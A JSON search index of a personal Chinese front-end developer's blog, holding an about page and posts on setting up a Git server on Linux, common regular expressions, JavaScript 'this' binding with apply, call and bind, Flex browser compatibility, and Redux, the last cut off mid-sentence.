{"pages":[{"title":"","text":".terminal { position: relative; background: #32353a; border-radius: 4px; padding: 20px; } .terminal .prompt { background: #ff3e3e; border-radius: 2px; color: #fff; width: 100px; margin: 0 auto; text-align: center; } .terminal .output { margin-top: 40px; color: #fff; text-align: center; line-height: 30px; } @media only screen and (max-width: 641px) { } WARNING LINK IS DEAD. 您要的页面不见啦","link":"/404.html"},{"title":"关于","text":"关于本人：昵称：羽叶丶英文名：Crito性别：男年龄：90 后职业：前端打杂搬砖人员，略微代码洁癖爱好：网上冲浪，游戏撩妹Telegram：https://t.me/yuyehackGithub：https://github.com/cyeaMail：yuyehack@gmail.com 英文名取自日本动漫《刀剑神域》的主角 Kirito 但是日文发音太严重，就换了第一个音。 个人服务网站 掘金图床 : https://upload.chenyeah.com/400375 OneIndex : https://pan.chenyeah.com/ API : https://api.chenyeah.com/ https://api.chenyeah.com/shanbay (扇贝每日一句) https://api.chenyeah.com/icba (icba 每日一句) https://api.chenyeah.com/qr?text=&size= (二维码) https://api.chenyeah.com/douyin?url= (抖音去水印) 关于博客：博客主要用来记录我的学习与生活，希望能帮助到遇到同样困惑的朋友。 博客内容大部分以前都是技术类，但是人还是要关注生活，以后也会分享分享其他有趣的东西或者技巧和工具及美好的生活！ 博客历程目前本博客由hexo驱动，Icarus主题，加上基于 Valine的评论系统，又经过我的魔性改动成了现在这样。","link":"/about/index.html"},{"title":"友链","text":"排名不分先后,如需交换友链请看下面 申请方式推荐方式：直接在下方评论区留言发送 Email: yuyehack@gmail.com看到就上链 注意事项 先友后链，先友后链, 先友后链：毕竟是“友链”不是“导航页面” 头像尽量https协议，而且没有防盗链设置，不然会显示不了头像","link":"/links/index.html"},{"title":"","text":"网易云 热评 10W+","link":"/music/index.html"}],"posts":[{"title":"在 Linux 下搭建 Git 服务器步骤","text":"由于代码经常改动，搞得头大，就想找个代码管理工具。查了一些资料，最后选择使用 git 管理代码，下面将搭建的过程记录下来。（亲测可以使用） “content: “### 环境：服务器 CentOS6.6 + git（version 1.7.1）客户端 Windows10 + git（version 2.8.4.windows.1） ① 安装 GitLinux 做为服务器端系统，Windows 作为客户端系统，分别安装 Git服务器端： 1yum install -y git 安装完后，查看 Git 版本 1[root@localhost ~]# git --version git version 1.12.6 客户端：下载 Git for Windows，地址：https://git-for-windows.github.io/安装完之后，可以使用 Git Bash 作为命令行客户端。安装完之后，查看 Git 版本 1$ git --version git version 2.15.1.windows.2 ② 服务器端创建 git 用户，用来管理 Git 服务，并为 git 用户设置密码1[root@localhost home]# useradd git [root@localhost home]# passwd git ③ 服务器端创建 Git 仓库设置 /home/first.git 为 Git 仓库然后把 Git 仓库的 owner 修改为 git 123[root@localhost home]# git init --bare first.gitInitialized empty Git repository in /home/first.git[root@localhost git]# chown -R git:git first.git 给仓库设置 700 权限 尽量 700 权限 1chmod -R 700 /home/first.git/* ④ 客户端 clone 远程仓库Git 服务器就已经搭得差不多了。下面我们在客户端 clone 一下远程仓库 12$ git clone git@xxx.xxx.xxx.xxx:/home/first.git Cloning into 'first'...The authenticity of host 'xxx.xxx.xxx.xxx (xxx.xxx.xxx.xxx)' can't be established. RSA key fingerprint is 2b:55:45:e7:4c:29:cc:05:33:78:03:bd:a8:cd:08:9d. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added 'xxx.xxx.xxx.xxx' (RSA) to the list of known hosts. git@192.168.8.34's password: 这里两点需要注意：第一，当你第一次使用 Git 的 clone 或者 push 命令连接 GitHub 时，会得到一个警告：这是因为 Git 使用 SSH 连接，而 SSH 连接在第一次验证 GitHub 服务器的 Key 时，需要你确认 GitHub 的 Key 的指纹信息是否真的来自 GitHub 的服务器，输入 yes 回车即可。Git 会输出一个警告，告诉你已经把 GitHub 的 Key 添加到本机的一个信任列表里了： 1Warning: Permanently added 'github.com' (RSA) to the list of known hosts. 此时 C:\\\\Users\\\\用户名\\\\.ssh 下会多出一个文件 known_hosts，以后在这台电脑上再次连接目标 Git 服务器时不会再提示上面的语句。这个警告只会出现一次，后面的操作就不会有任何警告了。如果你实在担心有人冒充 GitHub 服务器，输入 yes 前可以对照 GitHub 的 RSA Key 的指纹信息是否与 SSH 连接给出的一致。第二，这里提示你输入密码才能 clone，当然如果你知道密码，可以键入密码来进行 clone，但是更为常见的方式，是利用 SSH 的公钥来完成验证。 ⑤ 客户端创建 SSH 公钥和私钥1$ ssh-keygen -t rsa -C \"youremail@example.com\" 你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可，由于这个 Key 也不是用于军事目的，所以也无需设置密码。如果一切顺利的话，可以在用户主目录里找到.ssh 目录，里面有 id_rsa 和 id_rsa.pub 两个文件，这两个就是 SSH Key 的秘钥对，id_rsa 是私钥，不能泄露出去，id_rsa.pub 是公钥，可以放心地告诉任何人。 ⑥ 服务器端 Git 打开 RSA 认证然后就可以去 Git 服务器上添加你的公钥用来验证你的信息了。在 Git 服务器上首先需要将/etc/ssh/sshd_config 中将 RSA 认证打开，即： 1RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys 这里我们可以看到公钥存放在.ssh/authorized_keys 文件中。所以我们在/home/git 下创建.ssh 目录然后把 .ssh 文件夹的 owner 修改为 git 1[root@localhost git]# chown -R git:git .ssh ⑦ 将公钥导入服务器端 authorized_keys 文件将电脑C:\\\\Users\\\\用户名\\\\.ssh\\\\id_rsa.pub文本可以导入到/home/git/.ssh/authorized_keys 重要：修改 .ssh 目录的权限为 700修改 .ssh/authorized_keys 文件的权限为 600 123[root@localhost git]# chmod 700 .ssh[root@localhost git]# cd .ssh[root@localhost .ssh]# chmod 600 authorized_keys 再重启 ssh 服务 1service sshd start 之后 clone 就不要输密码了 ⑨ 禁止 git 用户 ssh 登录服务器之前在服务器端创建的 git 用户不允许 ssh 登录服务器编辑 /etc/passwd找到：git:x:502:504::/home/git:/bin/bash 修改为git:x:502:504::/home/git:/bin/git-shell此时 git 用户可以正常通过 ssh 使用 git，但无法通过 ssh 登录系统。","link":"/posts/d2d14fcf/"},{"title":"常用正则表达式","text":"校验数字的表达式 数字：^[0-9]*$ n 位的数字：^\\\\d{n}$ 至少 n 位的数字：^\\\\d{n,}$ m-n 位的数字：^\\\\d{m,n}$ 零和非零开头的数字：^(0|[1-9][0-9]*)$ 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$ 带 1-2 位小数的正数或负数：^(\\\\-)?\\\\d+(\\\\.\\\\d{1,2})?$ 正数、负数、和小数：^(\\\\-|\\\\+)?\\\\d+(\\\\.\\\\d+)?$ 有两位小数的正实数：^[0-9]+(.[0-9]{2})?$ 有 1~3 位小数的正实数：^[0-9]+(.[0-9]{1,3})?$ 非零的正整数：^[1-9]\\\\d*$或 ^([1-9][0-9]*){1,3}$或 ^\\\\+?[1-9][0-9]*$ 非零的负整数：^\\\\-[1-9][]0-9\\\"*$或^-[1-9]\\\\d*$ 非负整数：^\\\\d+$ 或 ^[1-9]\\\\d*|0$ 非正整数：^-[1-9]\\\\d*|0$ 或 ^((-\\\\d+)|(0+))$ 非负浮点数：^\\\\d+(\\\\.\\\\d+)?$ 或 ^[1-9]\\\\d*\\\\.\\\\d*|0\\\\.\\\\d*[1-9]\\\\d*|0?\\\\.0+|0$ 非正浮点数：^((-\\\\d+(\\\\.\\\\d+)?)|(0+(\\\\.0+)?))$ 或^(-([1-9]\\\\d*\\\\.\\\\d*|0\\\\.\\\\d*[1-9]\\\\d*))|0?\\\\.0+|0$ 正浮点数：^[1-9]\\\\d*\\\\.\\\\d*|0\\\\.\\\\d*[1-9]\\\\d*$ 或 ^(([0-9]+\\\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\\\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 负浮点数：^-([1-9]\\\\d*\\\\.\\\\d*|0\\\\.\\\\d*[1-9]\\\\d*)$或 ^(-(([0-9]+\\\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 浮点数：^(-?\\\\d+)(\\\\.\\\\d+)?$ 或 ^-?([1-9]\\\\d*\\\\.\\\\d*|0\\\\.\\\\d*[1-9]\\\\d*|0?\\\\.0+|0)$ 校验字符的表达式 汉字：^[\\\\u4e00-\\\\u9fa5]{0,}$ 英文和数字：^[A-Za-z0-9]+$ 或^[A-Za-z0-9]{4,40}$ 长度为 3-20 的所有字符：^.{3,20}$ 由 26 个英文字母组成的字符串：^[A-Za-z]+$ 由 26 个大写英文字母组成的字符串：^[A-Z]+$ 由 26 个小写英文字母组成的字符串：^[a-z]+$ 由数字和 26 个英文字母组成的字符串：^[A-Za-z0-9]+$ 由数字、26 个英文字母或者下划线组成的字符串：^\\\\w+$ 或 ^\\\\w{3,20}$ 中文、英文、数字包括下划线：^[\\\\u4E00-\\\\u9FA5A-Za-z0-9_]+$ 中文、英文、数字但不包括下划线等符号：^[\\\\u4E00-\\\\u9FA5A-Za-z0-9]+$ 或 ^[\\\\u4E00-\\\\u9FA5A-Za-z0-9]{2,20}$ 可以输入含有^%&',;=?$\\\\\\\"等字符：[^%&',;=?$\\\\x22]+ 12 禁止输入含有的字符：`[^\\x22]+` 特殊需求表达式 Email 地址：^\\\\w+([-+.]\\\\w+)*@\\\\w+([-.]\\\\w+)*\\\\.\\\\w+([-.]\\\\w+)*$ 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.? InternetURL：[a-zA-z]+://[^\\\\s]* 或 ^http://([\\\\w-]+\\\\.)+[\\\\w-]+(/[\\\\w-./?%&=]*)?$ 电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^(\\\\(\\\\d{3,4}-)|\\\\d{3.4}-)?\\\\d{7,8}$ 国内电话号码(0511-4405222、021-87888822)：\\\\d{3}-\\\\d{8}|\\\\d{4}-\\\\d{7} 身份证号(15 位、18 位数字)：^\\\\d{15}|\\\\d{18}$ 短身份证号码(数字、字母 x 结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\\\\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$ 帐号是否合法(字母开头，允许 5-16 字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 密码(以字母开头，长度在 6~18 之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\\\w{5,17}$ 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：^(?=.*\\\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 日期格式：^\\\\d{4}-\\\\d{1,2}-\\\\d{1,2} 一年的 12 个月(01 ～ 09 和 1 ～ 12)：^(0?[1-9]|1[0-2])$ 一个月的 31 天(01 ～ 09 和 1 ～ 31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 钱的输入格式： 有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：^[1-9][0-9]*$ 这表示任意一个不以 0 开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 一个 0 或者一个不以 0 开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 这表示一个 0 或者一个可能为负的开头不为 0 的数字.让用户以 0 开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 必须说明的是,小数点后面至少应该有 1 位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：^[0-9]+(.[0-9]{2})?$ 这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$ 这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 1 到 3 个数字,后面跟着任意个 逗号+3 个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$备注：这就是最终结果了,别忘了”+”可以用”*”替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 中文字符的正则表达式：[\\\\u4e00-\\\\u9fa5] 双字节字符：[^\\\\x00-\\\\xff](包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计 2，ASCII 字符计 1)) 空白行的正则表达式：\\ \\\\s*\\\\r (可以用来删除空白行) HTML 标记的正则表达式：]*>.*?| (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 首尾空白字符的正则表达式：^\\\\s*|\\\\s*$或(^\\\\s*)|(\\\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 腾讯 QQ 号：[1-9][0-9]{4,}(腾讯 QQ 号从 10000 开始) 中国邮政编码：[1-9]\\\\d{5}(?!\\\\d) (中国邮政编码为 6 位数字) IP 地址：\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+(提取 IP 地址时有用) IP 地址：((?:(?:25[0-5]|2[0-4]\\\\\\\\d|[01]?\\\\\\\\d?\\\\\\\\d)\\\\\\\\.){3}(?:25[0-5]|2[0-4]\\\\\\\\d|[01]?\\\\\\\\d?\\\\\\\\d))","link":"/posts/81d5af05/"},{"title":"this、apply、call、bind 区别","text":"这又是一个经典问题/(ㄒ o ㄒ)/也是 ES5 中众多坑中的一个，在 ES6 中可能会极大避免 this 产生的错误，但是为了一些老代码的维护，最好还是了解一下 this 的指向和 call、apply、bind 三者的区别。” this 的指向在 ES5 中，其实 this 的指向，始终坚持一个原理：this 永远指向最后调用它的那个对象，来，跟着我朗读三遍：this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象。记住这句话，this 你已经了解一半了。 下面我们来看一个最简单的例子： 例 1： 12345678910var name = \"windowsName\";function a() { var name = \"Cherry\"; console.log(this.name); // windowsName console.log(\"inner:\" + this); // inner: Window}a();console.log(\"outer:\" + this); // outer: Window 这个相信大家都知道为什么 log 的是 windowsName，因为根据刚刚的那句话“this 永远指向最后调用它的那个对象”，我们看最后调用 a 的地方 a();，前面没有调用的对象那么就是全局对象 window，这就相当于是 window.a()；注意，这里我们没有使用严格模式，如果使用严格模式的话，全局对象就是 undefined，那么就会报错 Uncaught TypeError: Cannot read property 'name' of undefined。 再看下这个例子： 例 2： 12345678var name = \"windowsName\";var a = { name: \"Cherry\", fn: function() { console.log(this.name); // Cherry }};a.fn(); 在这个例子中，函数 fn 是对象 a 调用的，所以打印的值就是 a 中的 name 的值。是不是有一点清晰了呢~ 我们做一个小小的改动： 例 3： 12345678var name = \"windowsName\";var a = { name: \"Cherry\", fn: function() { console.log(this.name); // Cherry }};window.a.fn(); 这里打印 Cherry 的原因也是因为刚刚那句话“this 永远指向最后调用它的那个对象”，最后调用它的对象仍然是对象 a。 我们再来看一下这个例子： 例 4： 12345678var name = \"windowsName\";var a = { // name: \"Cherry\", fn: function() { console.log(this.name); // undefined }};window.a.fn(); 这里为什么会打印 undefined 呢？这是因为正如刚刚所描述的那样，调用 fn 的是 a 对象，也就是说 fn 的内部的 this 是对象 a，而对象 a 中并没有对 name 进行定义，所以 log 的 this.name 的值是 undefined。 这个例子还是说明了：this 永远指向最后调用它的那个对象，因为最后调用 fn 的对象是 a，所以就算 a 中没有 name 这个属性，也不会继续向上一个对象寻找 this.name，而是直接输出 undefined。 再来看一个比较坑的例子： 例 5： 1234567891011var name = \"windowsName\";var a = { name: null, // name: \"Cherry\", fn: function() { console.log(this.name); // windowsName }};var f = a.fn;f(); 这里你可能会有疑问，为什么不是 Cherry，这是因为虽然将 a 对象的 fn 方法赋值给变量 f 了，但是没有调用，再接着跟我念这一句话：“this 永远指向最后调用它的那个对象”，由于刚刚的 f 并没有调用，所以 fn() 最后仍然是被 window 调用的。所以 this 指向的也就是 window。 由以上五个例子我们可以看出，this 的指向并不是在创建的时候就可以确定的，在 es5 中，永远是this 永远指向最后调用它的那个对象。 再来看一个例子： 例 6： 1234567891011var name = \"windowsName\";function fn() { var name = \"Cherry\"; innerFunction(); function innerFunction() { console.log(this.name); // windowsName }}fn(); 读到现在了应该能够理解这是为什么了吧(o ﾟ ▽ ﾟ)o。 怎么改变 this 的指向改变 this 的指向我总结有以下几种方法： 使用 ES6 的箭头函数 在函数内部使用 _this = this 使用 apply、call、bind new 实例化一个对象 例 7： 1234567891011121314151617var name = \"windowsName\";var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout(function() { this.func1(); }, 100); }};a.func2(); // this.func1 is not a function 在不使用箭头函数的情况下，是会报错的，因为最后调用 setTimeout 的对象是 window，但是在 window 中并没有 func1 函数。 我们在改变 this 指向这一节将把这个例子作为 demo 进行改造。 箭头函数 众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。箭头函数的 this 始终指向函数定义时的 this，而非执行时。，箭头函数需要记着这句话：“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”。 例 8 ： 1234567891011121314151617var name = \"windowsName\";var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout(() => { this.func1(); }, 100); }};a.func2(); // Cherry 在函数内部使用 _this = this 如果不使用 ES6，那么这种方式应该是最简单的不会出错的方式了，我们是先将调用这个函数的对象保存在变量 _this 中，然后在函数中都使用这个 _this，这样 _this 就不会改变了。 例 9： 123456789101112131415161718var name = \"windowsName\";var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { var _this = this; setTimeout(function() { _this.func1(); }, 100); }};a.func2(); // Cherry 这个例子中，在 func2 中，首先设置 var _this = this;，这里的 this 是调用 func2 的对象 a，为了防止在 func2 中的 setTimeout 被 window 调用而导致的在 setTimeout 中的 this 为 window。我们将 this(指向变量 a) 赋值给一个变量 _this，这样，在 func2 中我们使用 _this 就是指向对象 a 了。 使用 apply、call、bind 使用 apply、call、bind 函数也是可以改变 this 的指向的，原理稍后再讲，我们先来看一下是怎么实现的： 使用 apply例 10： 123456789101112131415161718var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout( function() { this.func1(); }.apply(a), 100 ); }};a.func2(); // Cherry 使用 call例 11： 123456789101112131415161718var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout( function() { this.func1(); }.call(a), 100 ); }};a.func2(); // Cherry 使用 bind例 12： 123456789101112131415161718var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout( function() { this.func1(); }.bind(a)(), 100 ); }};a.func2(); // Cherry apply、call、bind 区别刚刚我们已经介绍了 apply、call、bind 都是可以改变 this 的指向的，但是这三个函数稍有不同。 在 MDN 中定义 apply 如下； apply() 方法调用一个函数, 其具有一个指定的 this 值，以及作为一个数组（或类似数组的对象）提供的参数 语法： fun.apply(thisArg, [argsArray]) thisArg：在 fun 函数运行时指定的 this 值。需要注意的是，指定的 this 值并不一定是该函数执行时真正的 this 值，如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是 window 对象），同时值为原始值（数字，字符串，布尔值）的 this 会指向该原始值的自动包装对象。 argsArray：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。从 ECMAScript 5 开始可以使用类数组对象。浏览器兼容性请参阅本文底部内容。 apply 和 call 的区别 其实 apply 和 call 基本类似，他们的区别只是传入的参数不同。 call 的语法为： fun.call(thisArg[, arg1[, arg2[, ...]]]) 所以 apply 和 call 的区别是 call 方法接受的是若干个参数列表，而 apply 接收的是一个包含多个参数的数组。 例 13： 123456789var a = { name: \"Cherry\", fn: function(a, b) { console.log(a + b); }};var b = a.fn;b.apply(a, [1, 2]); // 3 例 14： 123456789var a = { name: \"Cherry\", fn: function(a, b) { console.log(a + b); }};var b = a.fn;b.call(a, 1, 2); // 3 bind 和 apply、call 区别 我们先来将刚刚的例子使用 bind 试一下 123456789var a = { name: \"Cherry\", fn: function(a, b) { console.log(a + b); }};var b = a.fn;b.bind(a, 1, 2); 我们会发现并没有输出，这是为什么呢，我们来看一下 MDN 上的文档说明： bind()方法创建一个新的函数, 当被调用时，将其 this 关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。 所以我们可以看出，bind 是创建一个新的函数，我们必须要手动去调用： 123456789var a = { name: \"Cherry\", fn: function(a, b) { console.log(a + b); }};var b = a.fn;b.bind(a, 1, 2)(); // 3 ==================================== 更新============================== JS 中的函数调用看到留言说，很多童靴不理解为什么 例 6 的 innerFunction 和 例 7 的 this 是指向 window 的，所以我就来补充一下 JS 中的函数调用。 例 6： 1234567891011var name = \"windowsName\";function fn() { var name = \"Cherry\"; innerFunction(); function innerFunction() { console.log(this.name); // windowsName }}fn(); 例 7： 1234567891011121314151617var name = \"windowsName\";var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout(function() { this.func1(); }, 100); }};a.func2(); // this.func1 is not a function 函数调用的方法一共有 4 种 作为一个函数调用 函数作为方法调用 使用构造函数调用函数 作为函数方法调用函数（call、apply） 作为一个函数调用 比如上面的 例 1： 例 1： 12345678910var name = \"windowsName\";function a() { var name = \"Cherry\"; console.log(this.name); // windowsName console.log(\"inner:\" + this); // inner: Window}a();console.log(\"outer:\" + this); // outer: Window 这样一个最简单的函数，不属于任何一个对象，就是一个函数，这样的情况在 JavaScript 的在浏览器中的非严格模式默认是属于全局对象 window 的，在严格模式，就是 undefined。 但这是一个全局的函数，很容易产生命名冲突，所以不建议这样使用。 函数作为方法调用 所以说更多的情况是将函数作为对象的方法使用。比如例 2： 例 2： 12345678var name = \"windowsName\";var a = { name: \"Cherry\", fn: function() { console.log(this.name); // Cherry }};a.fn(); 这里定义一个对象 a，对象 a 有一个属性（name）和一个方法（fn）。 然后对象 a 通过 . 方法调用了其中的 fn 方法。 然后我们一直记住的那句话“this 永远指向最后调用它的那个对象”，所以在 fn 中的 this 就是指向 a 的。 使用构造函数调用函数 如果函数调用前使用了 new 关键字, 则是调用了构造函数。这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象： 123456789// 构造函数:function myFunction(arg1, arg2) { this.firstName = arg1; this.lastName = arg2;}// This creates a new objectvar a = new myFunction(\"Li\", \"Cherry\");a.lastName; // 返回 \"Cherry\" 这就有要说另一个面试经典问题：new 的过程了，(ಥ_ಥ) 这里就简单的来看一下 new 的过程吧： 伪代码表示： 12345678var a = new myFunction(\"Li\",\"Cherry\");new myFunction{ var obj = {}; obj.__proto__ = myFunction.prototype; var result = myFunction.call(obj,\"Li\",\"Cherry\"); return typeof result === 'obj'? result : obj;} 创建一个空对象 obj; 将新创建的空对象的隐式原型指向其构造函数的显示原型。 使用 call 改变 this 的指向 如果无返回值或者返回一个非对象值，则将 obj 返回作为新对象；如果返回值是一个新对象的话那么直接直接返回该对象。 所以我们可以看到，在 new 的过程中，我们是使用 call 改变了 this 的指向。 作为函数方法调用函数 在 JavaScript 中, 函数是对象。 JavaScript 函数有它的属性和方法。call() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身 在 JavaScript 严格模式(strict mode)下, 在调用函数时第一个参数会成为 this 的值， 即使该参数不是一个对象。在 JavaScript 非严格模式(non-strict mode)下, 如果第一个参数的值是 null 或 undefined, 它将使用全局对象替代。 这个时候我们再来看例 6： 例 6： 1234567891011var name = \"windowsName\";function fn() { var name = \"Cherry\"; innerFunction(); function innerFunction() { console.log(this.name); // windowsName }}fn(); 这里的 innerFunction() 的调用是不是属于第一种调用方式：作为一个函数调用（它就是作为一个函数调用的，没有挂载在任何对象上，所以对于没有挂载在任何对象上的函数，在非严格模式下 this 就是指向 window 的） 然后再看一下 例 7： 例 7： 1234567891011121314151617var name = \"windowsName\";var a = { name: \"Cherry\", func1: function() { console.log(this.name); }, func2: function() { setTimeout(function() { this.func1(); }, 100); }};a.func2(); // this.func1 is not a function 这个简单一点的理解可以理解为“匿名函数的 this 永远指向 window”，你可以这样想，还是那句话this 永远指向最后调用它的那个对象，那么我们就来找最后调用匿名函数的对象，这就很尴尬了，因为匿名函数名字啊，笑哭，所以我们是没有办法被其他对象调用匿名函数的。所以说 匿名函数的 this 永远指向 window。 如果这个时候你要问，那匿名函数都是怎么定义的，首先，我们通常写的匿名函数都是自执行的，就是在匿名函数后面加 () 让其自执行。其次就是虽然匿名函数不能被其他对象调用，但是可以被其他函数调用啊，比如例 7 中的 setTimeout。 本文转自：cherryblog.site/","link":"/posts/3a27a8ad/"},{"title":"Flex布局兼容国内浏览器的双核模式","text":"flex 布局不支持低版本 ie 内核是确定了，没办法的改变的事实，但是国产浏览器采用哪一个内核打开你的页面，这个是你可以控制的。在 html 的标签中加入如下代码： 1 然后浏览器打开你的页面时，会默认采用 chrome 内核来渲染页面，这是 360 浏览器的功能，其他国产浏览器也支持。 但是用户非要点击“兼容模式”怎么办？我们还可以控制浏览器调用的 ie 渲染引擎的版本。在 html 的标签中加入如下代码： 1 这个指令不要被 edge 这个单词迷惑，他指的不是 edge 浏览器。而是告诉 ie 渲染引擎，使用最新内核，且采用标准模式渲染页面。chrome 这个指令也建议保留，他是让 IE 用户打开你的网页时，尝试调用 chrome 框架插件的。这是一个很老的 ie 插件，google 出品，让 ie 支持 chrome 内核。 最后这两个指令都添加完毕之后，能实现这样的效果，国产浏览器打开你的网页时，优先调用 chrome 内核渲染。如果用户强制点击，选择兼容模式，会调用操作系统内安装的 IE 的标准模式渲染你的页面。如果用户的操作系统内安装了 ie9 或以上，则正常显示 flex。如果用户使用 ie 打开你的页面，当 ie 版本是 9 以上，或者系统内安装了 chrome 框架插件，flex 也能正常工作。 所以以防万一 尽量 html标签中都加入如下代码 12","link":"/posts/8f449293/"},{"title":"Redux流程讲解","text":"随着应用程序单页面需求的越来越复杂，应用状态的管理也变得越来越混乱，而 Redux 的就是为解决这一问题而出现的。在一个大型的应用程序中，应用的状态不仅包括从服务器获取的数据，还包括本地创建的数据，以及反应本地 UI 状态的数据，而 Redux 正是为解决这一复杂问题而存在的。 redux 作为一种单向数据流的实现，配合 react 非常好用，尤其是在项目比较大，逻辑比较复杂的时候，单项数据流的思想能使数据的流向、变化都能得到清晰的控制，并且能很好的划分业务逻辑和视图逻辑。下图是 redux 的基本运作的流程。 如上图所示，该图展示了 Redux 框架数据的基本工作流程。简单来说，首先由 view dispatch 拦截 action，然后执行对应 reducer 并更新到 store 中，最终 views 会根据 store 数据的改变执行界面的刷新渲染操作。 同时，作为一款应用状态管理框架，为了让应用的状态管理不再错综复杂，使用 Redux 时应遵循三大基本原则，否则应用程序很容易出现难以察觉的问题。这三大原则包括： • 单一数据源 整个应用的 State 被存储在一个状态树中，且只存在于唯一的 Store 中。 • State 是只读的 对于 Redux 来说，任何时候都不能直接修改 state，唯一改变 state 的方法就是通过触发 action 来间接的修改。而这一看似繁琐的状态修改方式实际上反映了 Rudux 状态管理流程的核心思想，并因此保证了大型应用中状态的有效管理。 • 应用状态的改变通过纯函数来完成 Redux 使用纯函数方式来执行状态的修改，Action 表明了修改状态值的意图，而真正执行状态修改的则是 Reducer。且 Reducer 必须是一个纯函数，当 Reducer 接收到 Action 时，Action 并不能直接修改 State 的值，而是通过创建一个新的状态对象来返回修改的状态。 redux 的三大元素和 Flux 框架不同，Redux 框架主要由 Action、Reducer 和 Store 三大元素组成。 ActionAction 是一个普通的 JavaScript 对象，其中的 type 属性是必须的，用来表示 Action 的名称，type 一般被定义为普通的字符串常量。为了方便管理，一般通过 action creator 来创建 action，action creator 是一个返回 action 的函数。 在 Redux 中，State 的变化会导致 View 的变化，而 State 状态的改变是通过接触 View 来触发具体的 Action 动作的，根据 View 触发产生的 Action 动作的不同，就会产生不同的 State 结果。可以定义一个函数来生成不同的 Action，这个函数就被称为 action creator。例如： 12345678910const ADD_TODO = '添加事件 TODO';function addTodo(text) { return { type: ADD_TODO, text }}const action = addTodo('Learn Redux'); 上面代码中，addTodo 就是一个 action creator。但当应用程序的规模越来越大时，建议使用单独的模块或文件来存放 action。 Reducer当 Store 收到 action 以后，必须返回一个新的 State 才能触发 View 的变化，State 计算的过程即被称为 Reducer。Reducer 本质上是一个函数，它接受 Action 和当前 State 作为参数，并返回一个新的 State。格式如下： 12345const reducer = function (state, action) { // ... return new_state;}; 为了保持 reducer 函数的纯净，请不要在 reducer 中执行如下的一些操作： • 修改传入参数； • 执行有副作用的操作，如 API 请求和路由跳转； • 调用非纯函数，如 Date.now() 或 Math.random() 对于 Reducer 来说，整个应用的初始状态就可以直接作为 State 的默认值。例如： 123456789101112131415const defaultState = 0;const reducer = (state = defaultState, action) => { switch (action.type) { case 'ADD': return state + action.payload; default: return state; }};//手动调用const state = reducer(1, { type: 'ADD', payload: 2}); 不过，在实际使用过程中，reducer 函数并不需要像上面那样进行手动调用，Store 的 store.dispatch 方法会触发 Reducer 的自动执行。为此，只需要在生成 Store 的时候将 Reducer 传入 createStore 方法即可。例如： 123import { createStore } from 'redux';const store = createStore(reducer); 在上面的代码中，createStore 函数接受 Reducer 作为参数，该函数返回一个新的 Store，以后每当 store.dispatch 发送过来一个新的 Action，就会自动调用 Reducer 得到新的 State。 StoreStore 就是数据保存的地方，可以把它看成一个容器，整个应用中只能有一个 Store。同时，Store 还具有将 Action 和 Reducers 联系在一起的作用。Store 具有以下的一些功能： • 维持应用的 state； • 提供 